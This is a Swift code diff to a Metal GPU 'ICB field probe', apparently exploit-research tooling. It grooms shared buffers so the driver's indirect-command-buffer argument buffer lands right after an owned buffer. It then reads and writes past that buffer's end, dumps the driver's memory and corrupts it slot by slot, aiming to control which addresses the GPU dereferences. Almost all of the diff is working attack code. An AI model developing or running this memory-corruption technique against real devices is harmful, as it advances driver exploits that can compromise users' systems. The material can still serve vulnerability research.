@@ -2859,35 +2859,41 @@ func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
         slot.setVertexBuffer(sentinelBuf, offset: 0, at: 0)
         slot.drawPrimitives(.point, vertexStart: 0, vertexCount: 1, instanceCount: 1, baseInstance: 0)
 
-        // Find adjacent (lo, hi) — keep alive
+        // Spray to lo ONLY — leave lo+BUF_LEN free so the Metal driver's ICB argument
+        // buffer lands at that VA when the command buffer is committed.
+        // lo.contents()+BUF_LEN reaches the driver's buffer in CPU VA space because
+        // Metal shared-heap allocations are physically (and CPU-virtually) contiguous.
         var loRef: MTLBuffer? = nil
-        var hiRef: MTLBuffer? = nil
-        for _ in 0..<128 {
-            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
-                  let b = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
-            let lo = a.gpuAddress < b.gpuAddress ? a : b
-            let hi = a.gpuAddress < b.gpuAddress ? b : a
-            guard hi.gpuAddress == lo.gpuAddress &+ UInt64(BUF_LEN) else { continue }
-            loRef = lo; hiRef = hi
-            step("✓ pair: lo=0x\(String(lo.gpuAddress,radix:16)) hi=0x\(String(hi.gpuAddress,radix:16))")
-            break
-        }
-        guard let lo = loRef, let hi = hiRef else {
-            step("✗ spray miss after 128 pairs"); completion(); return
-        }
-
-        let q = hi.contents().assumingMemoryBound(to: UInt8.self)
-
-        // Helper: fill hi[from..<to] with a given UInt64 (8B aligned)
-        func fillHiVal(_ from: Int, _ to: Int, val: UInt64) {
-            var off = from
-            while off < to {
-                for bi in 0..<8 { q[off+bi] = UInt8((val >> (bi*8)) & 0xFF) }
-                off += 8
+        var nextGPUVA: UInt64  = 0
+        var keepAlives: [any MTLBuffer] = []
+        for _ in 0..<2048 {
+            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
+            if let prev = keepAlives.last,
+               a.gpuAddress == prev.gpuAddress + UInt64(BUF_LEN) {
+                loRef     = prev
+                nextGPUVA = a.gpuAddress   // driver should claim this VA
+                break                       // 'a' NOT stored → ARC releases → VA freed
             }
+            keepAlives.append(a)
         }
-        func fillHiSentinel(_ from: Int, _ to: Int) { fillHiVal(from, to, val: sentVA) }
-        func clearHi(_ from: Int, _ to: Int)        { fillHiVal(from, to, val: 0) }
+        guard let lo = loRef else {
+            step("✗ spray miss"); completion(); return
+        }
+        step("✓ lo=0x\(String(lo.gpuAddress,radix:16)) next=0x\(String(nextGPUVA,radix:16)) (unreserved for driver)")
+
+        // OOB helpers — reach driver's arg-buf at lo+BUF_LEN in CPU VA space
+        let loPtr = lo.contents().assumingMemoryBound(to: UInt8.self)
+        func readOOB8(_ off: Int) -> UInt64 {
+            var v: UInt64 = 0
+            for bi in 0..<8 { v |= UInt64(loPtr[BUF_LEN+off+bi]) << (bi*8) }
+            return v
+        }
+        func writeOOB8(_ off: Int, _ val: UInt64) {
+            for bi in 0..<8 { loPtr[BUF_LEN+off+bi] = UInt8((val >> (bi*8)) & 0xFF) }
+        }
+        func writeOOB4(_ off: Int, _ val: UInt32) {
+            for bi in 0..<4 { loPtr[BUF_LEN+off+bi] = UInt8((val >> (bi*8)) & 0xFF) }
+        }
 
         // Allocate dummyTex ONCE — keeps its resource ID stable across all probe calls
         let texDesc = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm,
@@ -2907,17 +2913,14 @@ func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
             return rt
         }()
 
-        step("hi gpuVA=0x\(String(hi.gpuAddress,radix:16)) (arg-buf target)")
+        step("driver arg-buf target gpuVA=0x\(String(nextGPUVA,radix:16))")
 
-        // probeExecFull — FRESH QUEUE per call + useResource(sentinelBuf)
-        // Fresh queue: avoids blacklisting after first GPU fault (code=4 "Ignored").
-        // useResource: makes sentinelBuf resident in GPU page table for ICB vertex fetch.
-        //   Without this, GPU faults accessing sentinelBuf even when hi has the right VA.
+        // probeExecFull — fresh queue per call + useResource(sentinelBuf)
         func probeExecFull() -> (Bool, String) {
             guard let freshQ = device.makeCommandQueue(),
                   let cb     = freshQ.makeCommandBuffer(),
                   let enc    = cb.makeRenderCommandEncoder(descriptor: rtDesc) else { return (false, "no cb") }
-            enc.useResource(sentinelBuf, usage: .read)   // ← mark vtxBuf resident for ICB
+            enc.useResource(sentinelBuf, usage: .read)
             enc.executeCommandsInBuffer(icb, range: 0..<1)
             enc.endEncoding()
             cb.commit(); cb.waitUntilCompleted()
@@ -2927,68 +2930,60 @@ func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
             return (true, s)
         }
 
-        // ── Phase D: zeros baseline (fresh Q + useResource) ──────────────────────
-        step("── phase D: zeros baseline (fresh Q + useResource) ──")
-        clearHi(0, BUF_LEN)
-        let (_, zeroErrStr) = probeExecFull()
-        step("  zeros err: \(zeroErrStr)")
+        // ── Phase D: driver arg-buf capture ──────────────────────────────────────
+        // Execute ICB with lo-only spray. Metal allocates the ICB's argument buffer at
+        // nextGPUVA (= lo+BUF_LEN). ICB should succeed — then lo OOB read reveals format.
+        step("── phase D: driver arg-buf capture ──")
+        let (dFault, dErr) = probeExecFull()
+        step("  first exec: \(dFault ? "FAULT" : "✓SUCCESS (driver arg-buf at 0x\(String(nextGPUVA,radix:16))!)")")
+        if dFault { step("  fault: \(dErr.prefix(120))") }
 
-        // ── Phase E: canary sweep — FRESH QUEUE PER SLOT (no blacklisting) ───────
-        // Each slot: unique canary 0xDEADC0DE_00000001..40, rest zeros.
-        // Fresh queue = each slot gets a real GPU execution, not a rate-limited reject.
-        // DIFF★ = error string changed vs zeros → GPU hit canary address (wrong VA dereffed).
-        // SUCCESS (f=0) = canary at that slot not treated as a VA → ICB executed clean.
-        step("── phase E: canary sweep (64 slots × 8B, fresh Q per slot) ──")
+        step("  lo+BUF_LEN dump (driver's arg-buf or next region, 256B):")
+        for row in 0..<16 {
+            let base = row * 16
+            var h = "  [+0x\(String(format:"%03x",base))]: "
+            for i in 0..<16 { h += String(format:"%02x ", loPtr[BUF_LEN+base+i]) }
+            for i in stride(from: 0, through: 8, by: 8) {
+                let off = base + i; guard off + 7 < 256 else { break }
+                let v = readOOB8(off)
+                if v == sentVA       { h += " sentVA@+\(String(format:"%x",off))" }
+                if v == lo.gpuAddress{ h += " loVA@+\(String(format:"%x",off))" }
+                if v == nextGPUVA   { h += " nextVA@+\(String(format:"%x",off))" }
+            }
+            step(h)
+        }
+
+        // ── Phase E: OOB canary sweep — corrupt driver's arg-buf one slot at a time ──
+        // Save driver's 512B of arg-buf. Restore between each slot.
+        // Look for: slot N corrupted → fault changes (or starts when D succeeded).
+        // That slot = live GPU-derefed field → we control where the GPU faults.
+        step("── phase E: OOB canary sweep (driver arg-buf via lo OOB) ──")
+        var savedBytes = [UInt8](repeating: 0, count: 512)
+        for i in 0..<512 { savedBytes[i] = loPtr[BUF_LEN+i] }
+        let (_, baseErr) = probeExecFull()
+        let baseSuccess  = baseErr.isEmpty
+        step("  baseline (saved driver buf): \(baseSuccess ? "✓SUCCESS" : "FAULT \(baseErr.prefix(60))")")
+
         for slotIdx in 0..<64 {
             let off = slotIdx * 8
-            clearHi(0, 512)
+            for i in 0..<512 { loPtr[BUF_LEN+i] = savedBytes[i] }  // restore
             let canary: UInt64 = 0xDEAD_C0DE_0000_0000 | UInt64(slotIdx + 1)
-            fillHiVal(off, off + 8, val: canary)
+            writeOOB8(off, canary)
             let (f, errStr) = probeExecFull()
-            let changed = errStr != zeroErrStr
-            step("  [\(String(format:"%02d",slotIdx))]+0x\(String(format:"%03x",off)) c=0x\(String(canary,radix:16)) f=\(f ? 1:0)\(changed ? " DIFF★" : "")\(!f ? " ✓SUCCESS" : "") \(errStr.prefix(120))")
+            let mattered = (f != !baseSuccess) || (errStr != baseErr)
+            let tag = !f ? " ✓SUCCESS" : (mattered ? " DIFF★" : "")
+            step("  [\(String(format:"%02d",slotIdx))]+0x\(String(format:"%03x",off)) c=0x\(String(canary,radix:16)) f=\(f ? 1:0)\(tag) \(errStr.prefix(80))")
         }
-        clearHi(0, BUF_LEN)
+        for i in 0..<512 { loPtr[BUF_LEN+i] = savedBytes[i] }
 
-        // ── Phase F: sentVA flood — with useResource sentinelBuf is now resident ──
-        // Hypothesis: sentVA at slot[00] + useResource = SUCCESS (vtxBuf field correct).
-        // If Phase E didn't yield SUCCESS, this flood might work.
-        step("── phase F: sentVA flood (all 512B, fresh Q + useResource) ──")
-        fillHiVal(0, 512, val: sentVA)
-        let (floodF, floodErr) = probeExecFull()
-        step("  sentVA×64slots: f=\(floodF ? 1:0)\(!floodF ? " ✓SUCCESS" : "") \(floodErr.prefix(120))")
-        clearHi(0, BUF_LEN)
-
-        // ── Phase G: 16B-stride sentVA sweep (fresh Q) ───────────────────────────
-        step("── phase G: 16B-stride sentVA sweep (fresh Q) ──")
-        for slotIdx in 0..<32 {
-            let off = slotIdx * 16
-            clearHi(0, 512)
-            fillHiVal(off, off + 8, val: sentVA)
-            let (f, errStr) = probeExecFull()
-            if !f {
-                step("  ★★★ 16B slot[\(slotIdx)]+0x\(String(format:"%03x",off)) sentVA → SUCCESS — vtxBuf field at +0x\(String(format:"%x",off))")
-                break
-            }
-            step("  [\(slotIdx)]+0x\(String(format:"%03x",off)) sentVA → FAULT \(errStr.prefix(60))")
-        }
-        clearHi(0, BUF_LEN)
-
-        // ── Phase H: 8B-stride sentVA sweep (fresh Q) ────────────────────────────
-        // Finer sweep in case 16B stride missed it.
-        step("── phase H: 8B-stride sentVA sweep (fresh Q) ──")
-        for slotIdx in 0..<64 {
-            let off = slotIdx * 8
-            clearHi(0, 512)
-            fillHiVal(off, off + 8, val: sentVA)
-            let (f, errStr) = probeExecFull()
-            if !f {
-                step("  ★★★ 8B slot[\(slotIdx)]+0x\(String(format:"%03x",off)) sentVA → SUCCESS — vtxBuf field CONFIRMED at +0x\(String(format:"%x",off))")
-                break
-            }
-            step("  [\(String(format:"%02d",slotIdx))]+0x\(String(format:"%03x",off)) sentVA → FAULT \(errStr.prefix(60))")
-        }
-        clearHi(0, BUF_LEN)
+        // ── Phase F: OOB sentVA flood ─────────────────────────────────────────────
+        // Overwrite driver's entire arg-buf region with sentVA via OOB.
+        // If driver's format is VA-based and sentVA is the right value, might succeed.
+        step("── phase F: OOB sentVA flood (all 512B, fresh Q) ──")
+        for i in stride(from: 0, to: 512, by: 8) { writeOOB8(i, sentVA) }
+        let (ffault, ferr) = probeExecFull()
+        step("  sentVA OOB flood: f=\(ffault ? 1:0)\(!ffault ? " ✓SUCCESS" : "") \(ferr.prefix(100))")
+        for i in 0..<512 { loPtr[BUF_LEN+i] = savedBytes[i] }
 
         step("── ICB Field Probe complete ──────────────")
         completion()
